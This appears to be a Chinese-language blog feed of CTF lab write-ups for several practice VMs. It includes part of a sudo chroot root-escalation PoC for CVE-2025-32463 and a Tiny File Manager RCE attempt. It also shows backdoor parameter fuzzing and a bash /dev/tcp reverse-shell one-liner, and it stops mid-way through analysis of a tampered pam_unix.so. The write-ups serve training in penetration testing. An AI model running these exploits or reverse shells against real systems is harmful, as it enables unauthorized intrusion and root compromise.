CMD_C_ESCAPED=$(printf '%s' '$CMD' | sed -e 's/\\/\\\\/g' -e 's/'/\\'/g')

cat &gt; woot1337.c&lt;&lt;EOF
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir('/');
  execl('/bin/sh', 'sh', '-c', '${CMD_C_ESCAPED}', NULL);
}
EOF

mkdir -p woot/etc libnss_
echo 'passwd: /woot1337' &gt; woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo 'woot!'
sudo -R woot woot
rm -rf ${STAGE?}
```

直接复制进去，不想下载了

```
todd@5ud0:/tmp$ vim a.sh
todd@5ud0:/tmp$ head -n 5 a.sh 
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
```

改点东西

![image-20250715214543419](https://7r1umphk.github.io/image/20250715214543644.webp)

改成有漏洞的

```
todd@5ud0:/tmp$ bash a.sh 
woot!
[sudo] password for todd: 
root@5ud0:/# id
uid=0(root) gid=0(root) groups=0(root),1000(todd)
root@5ud0:/# cat /root/root.txt /home/todd/user.txt 
flag{root-257f425d-1ea4-4b8e-8dd8-69523f25d249}
flag{user-80e68759-1ca0-45eb-82a7-601b1f78dfe5}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_5ud0.html</guid><pubDate>Tue, 15 Jul 2025 13:47:40 +0000</pubDate></item><item><title>内部_sudo</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sudo.html</link><description>![image-20250711174235043](https://7r1umphk.github.io/image/20250711174242755.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.175 08:00:27:14:e1:21       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.997 seconds (128.19 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.175
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 05:42 EDT
Nmap scan report for 192.168.205.175
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:14:E1:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
                       
```

看web

![image-20250711174336944](https://7r1umphk.github.io/image/20250711174337092.webp)

跳转不过去，拦一下jsdelivr的

![image-20250711174539493](https://7r1umphk.github.io/image/20250711174539834.webp)

跳转到

![image-20250711174433367](https://7r1umphk.github.io/image/20250711174433533.webp)

nuclei看看架构

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.175/tinyfilemanager.php

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.5

                projectdiscovery.io

[INF] Current nuclei version: v3.4.5 (outdated)
[INF] Current nuclei-templates version: v10.2.4 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 67
[INF] Templates loaded for current scan: 8150
[INF] Executing 7946 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 204 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1761 (Reduced 1653 Requests)
[INF] Using Interactsh Server: oast.pro
[cookies-without-httponly] [javascript] [info] 192.168.205.175 ['filemanager']
[cookies-without-secure] [javascript] [info] 192.168.205.175 ['filemanager']
[waf-detect:apachegeneric] [http] [info] http://192.168.205.175/tinyfilemanager.php
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.175:22
[ssh-password-auth] [javascript] [info] 192.168.205.175:22
[ssh-auth-methods] [javascript] [info] 192.168.205.175:22 ['['publickey','password']']
[ssh-server-enumeration] [javascript] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[openssh-detect] [tcp] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[form-detection] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tiny-file-manager] [http] [info] http://192.168.205.175/tinyfilemanager.php/index.php
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tech-detect:jsdelivr] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tech-detect:bootstrap] [http] [info] http://192.168.205.175/tinyfilemanager.php
[apache-detect] [http] [info] http://192.168.205.175/tinyfilemanager.php ['Apache/2.4.62 (Debian)']
[INF] Scan completed in 1m. 24 matches found.
                          
```

搜一下有没有洞

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ searchsploit tiny file manager
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities                  | php/webapps/36364.txt
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/36365.txt
MCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload                                                                                | php/webapps/15768.txt
Tiny File Manager 2.4.6 - Remote Code Execution (RCE)                                                                                           | php/webapps/50828.sh
TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                                                             | php/webapps/15194.txt
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd tmp                        
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ searchsploit -m php/webapps/50828.sh
  Exploit: Tiny File Manager 2.4.6 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50828
     Path: /usr/share/exploitdb/exploits/php/webapps/50828.sh
    Codes: CVE-2021-45010, CVE-2021-40964
 Verified: False
File Type: Unicode text, UTF-8 text
Copied to: /mnt/hgfs/gx/x/tmp/50828.sh


                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash /mnt/hgfs/gx/x/tmp/50828.sh

TIny File Manager Authenticated RCE Exploit.

By FEBIN

/mnt/hgfs/gx/x/tmp/50828.sh &lt;URL&gt; &lt;Admin Username&gt; &lt;Password&gt;

Example: /mnt/hgfs/gx/x/tmp/50828.sh http://files.ubuntu.local/index.php admin 'admin@123'

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash /mnt/hgfs/gx/x/tmp/50828.sh http://192.168.205.175/tinyfilemanager.php admin 'admin@123'
/usr/bin/curl
[✔] Curl found! 
/usr/bin/jq
[✔] jq found! 

[+]  Login Success! Cookie: filemanager=70k14rakb4d73nos0gib5frd7d 
jq: parse error: Invalid numeric literal at line 1, column 14
[-] Can't find WEBROOT! Using default /var/www/html 
[-] File Upload Unsuccessful! Exiting! 
                                           
```

失败，但是默认密码登录成功了，所以我们去web自己上传

![image-20250711175333897](https://7r1umphk.github.io/image/20250711175334236.webp)

成了，什么限制都没有，直接访问，拿shell（这个架构。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sudo.html</guid><pubDate>Fri, 11 Jul 2025 13:32:15 +0000</pubDate></item><item><title>内部_sML</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sML.html</link><description>![image-20250710215549207](https://7r1umphk.github.io/image/20250710215556665.webp)

复盘一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ sudo arp-scan -l  
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.174 08:00:27:a4:3b:3c       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.957 seconds (130.81 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p- 192.168.205.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-10 09:56 EDT
Nmap scan report for 192.168.205.174
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:A4:3B:3C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.31 seconds
                            
```

看web

![image-20250710215727831](https://7r1umphk.github.io/image/20250710215727984.webp)

试了一下弱密码，发现可以爆破user

![image-20250710215818476](https://7r1umphk.github.io/image/20250710215818575.webp)

爆破的同时看了一下源码，发现了他是使用的模板

![image-20250710215849837](https://7r1umphk.github.io/image/20250710215850057.webp)

下载一份

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ wget https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
--2025-07-10 09:59:34--  https://www.sourcecodester.com/sites/default/files/download/oretnom23/employee_records_system.zip
正在解析主机 www.sourcecodester.com (www.sourcecodester.com)... 172.67.190.48, 104.21.19.206, 2606:4700:3030::ac43:be30, ...
正在连接 www.sourcecodester.com (www.sourcecodester.com)|172.67.190.48|:443... 已连接。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sML.html</guid><pubDate>Thu, 10 Jul 2025 14:40:33 +0000</pubDate></item><item><title>内部_Backdoor1</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Backdoor1.html</link><description>![image-20250709215624782](https://7r1umphk.github.io/image/20250709215633404.webp)

打一个睡觉

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l           
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.172 08:00:27:56:2e:31       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.947 seconds (131.48 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.172     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 09:57 EDT
Nmap scan report for 192.168.205.172
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:56:2E:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
                                                          
```

那直接看web

![image-20250709215805803](https://7r1umphk.github.io/image/20250709215806158.webp)

疯狂暗示后门，哈哈哈

扫一下目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.172 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.172
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 12033]
/backdoor.php         (Status: 200) [Size: 0]
Progress: 49295 / 1102800 (4.47%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 50573 / 1102800 (4.59%)
===============================================================
Finished
===============================================================
                       
```

/backdoor.php啊这......

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.172/backdoor.php' -v
*   Trying 192.168.205.172:80...
* Connected to 192.168.205.172 (192.168.205.172) port 80
* using HTTP/1.x
&gt; GET /backdoor.php HTTP/1.1
&gt; Host: 192.168.205.172
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Wed, 09 Jul 2025 13:59:12 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Content-Length: 0
&lt; Content-Type: text/html; charset=UTF-8
&lt; 
* Connection #0 to host 192.168.205.172 left intact
                                            
```

没东西，应该是需要点参数，爆破一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -u 'http://192.168.205.172/backdoor.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.172/backdoor.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

password                [Status: 200, Size: 10, Words: 3, Lines: 1, Duration: 3ms]
cmd                     [Status: 200, Size: 15, Words: 3, Lines: 1, Duration: 0ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

两个参数，password，我们也不知道，直接爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -u 'http://192.168.205.172/backdoor.php?cmd=id&amp;password=FUZZ' -w /usr/share/wordlists/rockyou.txt   --fw 2                 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.172/backdoor.php?cmd=id&amp;password=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 2
________________________________________________

iloveyou                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

`Gmeek-html&lt;iframe src='//player.bilibili.com/player.html?isOutside=true&amp;aid=113575678971704&amp;bvid=BV19Bz4YuEi2&amp;cid=27120961338&amp;p=1&amp;autoplay=0' scrolling='no' border='0' frameborder='no' framespacing='0' allowfullscreen='true' width='100%' height='460px'&gt;&lt;/iframe&gt;`

贫一下，哈哈哈

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 'http://192.168.205.172/backdoor.php?cmd=id&amp;password=iloveyou' -v
*   Trying 192.168.205.172:80...
* Connected to 192.168.205.172 (192.168.205.172) port 80
* using HTTP/1.x
&gt; GET /backdoor.php?cmd=id&amp;password=iloveyou HTTP/1.1
&gt; Host: 192.168.205.172
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Date: Wed, 09 Jul 2025 14:03:13 GMT
&lt; Server: Apache/2.4.62 (Debian)
&lt; Content-Length: 0
&lt; Content-Type: text/html; charset=UTF-8
&lt; 
* Connection #0 to host 192.168.205.172 left intact
                    
```

没显示，tcpdump看看，建议直接在浏览器访问

kali监听

```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A -n icmp
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

![image-20250709220501352](https://7r1umphk.github.io/image/20250709220501561.webp)

发包卡了一会，看一下监听

```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A -n icmp
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:04:53.658512 IP 192.168.205.172 &gt; 192.168.205.128: ICMP echo request, id 620, seq 1, length 64
E..TaQ@.@.............e..l...wnh....SR
..................... !'#$%&amp;'()*+,-./01234567
10:04:53.658530 IP 192.168.205.128 &gt; 192.168.205.172: ICMP echo reply, id 620, seq 1, length 64
E..T.j..@./...........m..l...wnh....SR
..................... !'#$%&amp;'()*+,-./01234567
10:04:54.688807 IP 192.168.205.172 &gt; 192.168.205.128: ICMP echo request, id 620, seq 2, length 64
E..TbL@.@................l...wnh......
..................... !'#$%&amp;'()*+,-./01234567
10:04:54.688827 IP 192.168.205.128 &gt; 192.168.205.172: ICMP echo reply, id 620, seq 2, length 64
E..T....@./y.............l...wnh......
..................... !'#$%&amp;'()*+,-./01234567
```

ok，没有问题，这边我弹shell直接访问reverce.sh了，因为这个靶机的模板默认就只要busybox，我懒的稳固

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat reverse.sh                                                                             
bash -c '/bin/bash -i &gt;&amp; /dev/tcp/192.168.205.128/8888 0&gt;&amp;1'
              
```

然后开个web服务就好了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...

```

web访问

![image-20250709220710494](https://7r1umphk.github.io/image/20250709220710601.webp)

一直在转圈圈就对了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.172] 53922
bash: cannot set terminal process group (420): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Backdoor1:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Backdoor1:/var/www/html$ ls -al
ls -al
total 24
drwxr-xr-x 2 root root  4096 Jul  8 09:26 .
drwxr-xr-x 3 root root  4096 Apr  4 23:20 ..
-rw-r--r-- 1 root root   310 Jul  8 09:25 backdoor.php
-rw-r--r-- 1 root root 12033 Jul  8 09:26 index.html
www-data@Backdoor1:/var/www/html$ cd /home
cd /home
www-data@Backdoor1:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jul  8 09:12 .
drwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..
drwx------  2 morri morri 4096 Jul  8 09:13 morri
```

不给访问，那就试试弱密码吧，最近很喜欢出弱密码

```
www-data@Backdoor1:/home$ su morri
su morri
Password: morri
id
uid=1000(morri) gid=1000(morri) groups=1000(morri)
```

一发入魂

稳固

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

扒拉

```
morri@Backdoor1:/home$ cd morri/
morri@Backdoor1:~$ ls -al
total 24
drwx------ 2 morri morri 4096 Jul  8 09:13 .
drwxr-xr-x 3 root  root  4096 Jul  8 09:12 ..
-rw-r--r-- 1 morri morri  220 Jul  8 09:12 .bash_logout
-rw-r--r-- 1 morri morri 3526 Jul  8 09:12 .bashrc
-rw-r--r-- 1 morri morri  807 Jul  8 09:12 .profile
-rw-r--r-- 1 root  root    44 Jul  8 09:13 user.txt
morri@Backdoor1:~$ cat user.txt 
flag{user-4645258dd0f71f7f430bb4f3c37748e6}
morri@Backdoor1:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for morri: 
Sorry, user morri may not run sudo on Backdoor1.
morri@Backdoor1:~$ find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
morri@Backdoor1:~$ ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128                 [::]:22               [::]:*      
tcp     LISTEN   0        128                    *:80                  *:*      
morri@Backdoor1:~$ cd /opt/
morri@Backdoor1:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Apr  1 08:59 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
morri@Backdoor1:/opt$ ls /mnt/
morri@Backdoor1:/opt$ ls -la /mnt/
total 8
drwxr-xr-x  2 root root 4096 Mar 18 20:26 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
morri@Backdoor1:/opt$ ls -la /tmp/
total 8
```

什么都没有，按时间扒拉一下文件

```
morri@Backdoor1:/opt$ find / -type f -newermt '2025-07-05' ! -newermt '2025-07-10' ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2&gt;/dev/null
/usr/lib/x86_64-linux-gnu/security/pam_unix.so
/home/morri/.bash_logout
/home/morri/.bashrc
/home/morri/user.txt
/home/morri/.profile
/etc/gshadow-
/etc/sudoers
/etc/subgid-
/etc/apt/sources.list
/etc/hosts
/etc/ld.so.cache
/etc/shadow-
/etc/subgid
/etc/passwd-
/etc/gshadow
/etc/group-
/etc/shadow
/etc/subuid-
/etc/php/8.3/apache2/php.ini
/etc/subuid
/etc/group
/etc/hostname
/etc/resolv.conf
/etc/passwd
/var/www/html/index.html
/var/www/html/backdoor.php
/var/log/debug
/var/log/daemon.log.1
/var/log/apt/eipp.log.xz
/var/log/apt/term.log
/var/log/apt/history.log
/var/log/kern.log
/var/log/syslog
/var/log/btmp
/var/log/auth.log.1
/var/log/auth.log
/var/log/dpkg.log
/var/log/alternatives.log
/var/log/lastlog
/var/log/wtmp
/var/log/syslog.1
/var/log/faillog
/var/log/debug.1
/var/log/syslog.2.gz
/var/log/daemon.log
/var/log/user.log
/var/log/messages
/var/log/messages.1
/var/log/kern.log.1
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006397f6f5f0cb6-e7cfe6374e33fdfc.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system.journal
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006396a764f42ae-bf156f4b6c4eb513.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000@0006396aa29dceaf-fdca4d5bafaa45b8.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000.journal
/var/lib/dhcp/dhclient.enp0s3.leases
/var/lib/dpkg/lock
/var/lib/dpkg/info/libfl2:amd64.list
/var/lib/dpkg/info/curl.list
/var/lib/dpkg/info/m4.list
/var/lib/dpkg/info/flex.list
/var/lib/dpkg/info/libpam0g-dev:amd64.list
/var/lib/dpkg/info/libsigsegv2:amd64.list
/var/lib/dpkg/info/wget.list
/var/lib/dpkg/info/libfl-dev:amd64.list
/var/lib/dpkg/info/netcat-openbsd.list
/var/lib/dpkg/info/bison.list
/var/lib/dpkg/info/netcat.list
/var/lib/dpkg/info/libpam0g:amd64.list
/var/lib/dpkg/alternatives/yacc
/var/lib/dpkg/alternatives/nc
/var/lib/dpkg/triggers/Lock
/var/lib/dpkg/status
/var/lib/dpkg/status-old
/var/lib/apt/lists/mirrors.aliyun.com_debian_dists_bullseye-backports_InRelease
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_binary-amd64_Packages
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_InRelease
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_source_Sources
/var/lib/apt/extended_states
/var/lib/systemd/random-seed
/var/lib/systemd/timesync/clock
/var/lib/systemd/timers/stamp-logrotate.timer
/var/lib/systemd/timers/stamp-phpsessionclean.timer
/var/lib/sudo/lectured/morri
/var/lib/logrotate/status
/var/cache/apt/pkgcache.bin
/var/cache/apt/srcpkgcache.bin
/var/cache/debconf/templates.dat
/var/cache/debconf/config.dat-old
/var/cache/debconf/config.dat
/var/cache/debconf/templates.dat-old
```

他改了/usr/lib/x86_64-linux-gnu/security/pam_unix.so，这是PAM框架的一部分,通俗易懂一点就是密码验证

string瞄眼

````
morri@Backdoor1:/opt$ strings /usr/lib/x86_64-linux-gnu/security/pam_unix.so
P`^B
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
calloc
malloc
strncpy
strlen
crypt_r
free
pipe
fork
dup2
pam_modutil_sanitize_helper_fds
geteuid
setuid
execve
pam_syslog
stdout
fflush
_exit
__errno_location
waitpid
sigaction
pam_modutil_read
__isoc99_sscanf
pam_sm_acct_mgmt
pam_get_item
getuid
pam_get_data
dcngettext
snprintf
dcgettext
pam_sm_authenticate
pam_get_user
pam_get_authtok
pam_set_data
pam_sm_setcred
strcmp
fopen
fgets
strncmp
strtok_r
fclose
pam_sm_chauthtok
pam_prompt
pam_set_item
yp_get_default_domain
yp_master
getrpcport
strdup
clnt_create
authunix_create_default
xdr_int
clnt_sperrno
yperr_string
pam_sm_open_session
pam_modutil_getlogin
pam_sm_close_session
write
feof
__getdelim
strchr
__ctype_b_loc
strsep
strcasecmp
strncasecmp
strtol
memset
yp_bind
yp_match
yp_unbind
strcpy
memcpy
pam_fail_delay
gettimeofday
getpid
clock
pam_modutil_getpwnam
pam_modutil_getspnam
time
stpcpy
usleep
ulckpwdf
umask
fileno
__fxstat
fchown
fchmod
fputs
fsync
rename
unlink
fgetpwent
putpwent
fgetspent
putspent
xdr_string
strncat
libpam.so.0
libcrypt.so.1
libnsl.so.2
libc.so.6
pam_unix.so
XCRYPT_2.0
LIBNSL_1.0
GLIBC_2.3
GLIBC_2.7
GLIBC_2.14
GLIBC_2.2.5
LIBPAM_EXTENSION_1.1
LIBPAM_EXTENSION_1.0
LIBPAM_1.0
LIBPAM_MODUTIL_1.0
LIBPAM_MODUTIL_1.1.9
/root/Linux-PAM-1.3.1/libpam/.libs
u/UH
AWAVI
AUATUH
[]A\A]A^A_
AVAUI
[]A\A]A^A_
t$01
AUATUH
]A\A]A^
T$ H
HcL$
T$ H
D$ H
D$ H
AUATUH
]A\A]A^
]A\A]A^
 []A\
[]A\
AWAVAUATI
[]A\A]A^A_
AVAUATUSH
L$@H
T$&lt;H
t$X1
t$HH
t$HL
D$PH
l$`H
D$XD
D$DH
T$XD
T$XH
t$HH
t$HD
